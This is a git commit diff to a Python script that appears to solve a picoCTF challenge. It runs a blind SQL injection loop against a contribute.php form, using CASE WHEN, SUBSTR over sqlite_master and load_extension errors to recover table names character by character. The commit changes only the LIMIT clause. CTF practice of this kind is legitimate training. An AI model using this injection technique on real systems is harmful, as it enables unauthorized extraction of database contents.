ea847a9bf9bfbca4bdd855cacbce9c60be57a275
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2026-03-18 22:08:45 +0300

    Update pico.py

--- pico.py
+++ pico.py
@@ -7,7 +7,7 @@ try:
 	host = "http://wily-courier.picoctf.net:53455/contribute.php"
 	for pos in range(1,18):
 		for ch in alpha:
-			resp = requests.post(host, cookies = {"PHPSESSID": "ebc8e920c23c0f665ac6dcf314a66ecc"}, data={"moneys":"34242' OR CASE WHEN ((SELECT SUBSTR(name,{},1) FROM sqlite_master WHERE type='table' LIMIT 1,1) = '{}') THEN 1 ELSE load_extension(1) END -- -".format(pos, ch)})
+			resp = requests.post(host, cookies = {"PHPSESSID": "ebc8e920c23c0f665ac6dcf314a66ecc"}, data={"moneys":"34242' OR CASE WHEN ((SELECT SUBSTR(name,{},1) FROM sqlite_master WHERE type='table' LIMIT 1) = '{}') THEN 1 ELSE load_extension(1) END -- -".format(pos, ch)})
 			if "Unable to execute statement: not authorized" not in resp.text:
 				flag += ch
 				print(flag)
